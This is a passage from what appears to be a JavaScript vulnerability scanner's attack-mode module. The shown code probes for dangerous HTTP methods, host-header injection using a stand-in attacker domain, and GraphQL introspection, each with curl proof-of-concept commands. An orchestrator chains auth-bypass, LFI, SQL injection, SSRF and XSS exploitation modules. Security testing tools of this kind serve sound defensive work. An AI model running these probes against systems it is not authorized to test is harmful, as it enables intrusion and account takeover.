        title: `DANGEROUS HTTP METHODS ENABLED: ${allow}`,
        desc: `Server advertises ${allow}. TRACE enables Cross-Site Tracing (cookie theft), PUT/DELETE on web root enables defacement if mapped to filesystem.`,
        evidence: { allowHeader: allow },
        poc: makePoc({
          steps: [`1. OPTIONS request to ${base}`, `2. Server advertises: ${allow}`],
          request: rawRequest('OPTIONS', base),
          evidence: `Allow: ${allow}`,
          curl: `curl -sk -X OPTIONS -i '${base}' | grep -i allow`,
          fix: `Disable unused HTTP methods (nginx: limit_except; apache: <Limit>). TRACE must always be off (TraceEnable Off).`,
        }),
      }));
    }
  } catch {}

  // d) Host-header injection (cache/webroot poisoning probe)
  try {
    const r = await timeoutFetch(base, { headers: { 'X-Forwarded-Host': 'bbxattacker.example.com' } }, 7000);
    const body = await r.text().catch(() => '');
    if (body.includes('bbxattacker.example.com')) {
      out.push(makeFinding({
        id: 'hostheader',
        tool: 'misconfig', phase: 'bypass', severity: 'high',
        title: 'HOST HEADER INJECTION — attacker domain reflected in page',
        desc: `The app trusts X-Forwarded-Host and uses it in the rendered page. Attackers poison links (password-reset links pointing to attacker host = account takeover).`,
        evidence: { header: 'X-Forwarded-Host: bbxattacker.example.com', reflected: true },
        poc: makePoc({
          steps: [
            `1. Send request with header X-Forwarded-Host: attacker.com`,
            `2. Response contains attacker.com — app trusts the header`,
            `3. Classic exploit: trigger a password-reset email; reset link points to attacker.com → victim's reset token lands on attacker server → account takeover`,
          ],
          request: rawRequest('GET', base, { 'X-Forwarded-Host': 'bbxattacker.example.com' }),
          evidence: body.slice(0, 200),
          curl: `curl -sk '${base}' -H 'X-Forwarded-Host: bbxattacker.example.com' | grep -o 'bbxattacker.example.com' | head -1`,
          fix: 'Do not derive URLs from Host/X-Forwarded-Host headers. Hardcode base URL in config. Clear-host validation at the web server.',
        }),
      }));
    }
  } catch {}

  // e) GraphQL introspection
  try {
    const gq = await timeoutFetch(base + '/graphql', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: '{ __schema { types { name } } }' }),
    }, 7000);
    if (gq.status === 200) {
      const gb = await gq.text().catch(() => '');
      if (/__schema|types/i.test(gb) && gb.length > 50) {
        out.push(makeFinding({
          id: 'graphql-introspection',
          tool: 'misconfig', phase: 'bypass', severity: 'medium',
          title: 'GraphQL INTROSPECTION ENABLED at /graphql',
          desc: `The full API schema is queryable by anyone — every type, field, and mutation exposed. Attackers map your entire API surface automatically.`,
          evidence: { endpoint: base + '/graphql', excerpt: gb.slice(0, 200) },
          poc: makePoc({
            steps: [`1. POST {__schema{types{name}}} to ${base}/graphql`, `2. Full schema returned — entire API mapped`],
            request: rawRequest('POST', base + '/graphql', { 'Content-Type': 'application/json' }, '{"query":"{ __schema { types { name } } }"}'),
            evidence: gb.slice(0, 250),
            curl: `curl -sk -X POST '${base}/graphql' -H 'Content-Type: application/json' --data-raw '{"query":"{ __schema { types { name } } }"}' | head -c 300`,
            fix: 'Disable introspection in production (Apollo: introspection: false). Add depth limiting + query complexity limits.',
          }),
        }));
      }
    }
  } catch {}

  return out;
}

// ---------------- orchestrator ----------------
async function runAttacks({ url, hostname, dirFindings = [], subdomains = [], onPhase }) {
  const startedAt = now();
  const findings = [];
  const phases = [];
  const track = async (name, fn) => {
    const t0 = now();
    try {
      const r = await fn();
      if (r) findings.push(...r);
      phases.push({ phase: name, status: 'ok', ms: now() - t0 });
    } catch (e) {
      phases.push({ phase: name, status: 'error', error: String(e && e.message || e).slice(0, 120), ms: now() - t0 });
    }
  };

  const candidates = [url, ...dirFindings.map(d => d.url || d).filter(Boolean)].slice(0, 10);
  await track('auth-bypass', () => moduleAuthBypass(url, dirFindings));
  await track('lfi', () => moduleLfi(url, candidates));
  await track('sqli-deep', () => moduleSqliDeep(url));
  await track('ssrf-oob', () => moduleSsrfOob(url));
  await track('takeover', () => moduleTakeover(hostname, subdomains));
  await track('xss-poc', () => moduleXssPoc(url));
  await track('misconfig-bypass', () => moduleMisconfigBypass(url, hostname));

  const summary = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const f of findings) summary[f.severity] = (summary[f.severity] || 0) + 1;

  return {
    mode: 'attack',
    startedAt: new Date(startedAt).toISOString(),
    completedAt: new Date().toISOString(),
    durationMs: now() - startedAt,
    findings, phases, summary,
    note: 'Attack mode performs active exploitation attempts (login bypass, traversal, injection, OOB callbacks). Only run against targets you are authorized to test.',
  };
}

module.exports = { runAttacks: runAttacks, makeFinding, curlFor, rawRequest };
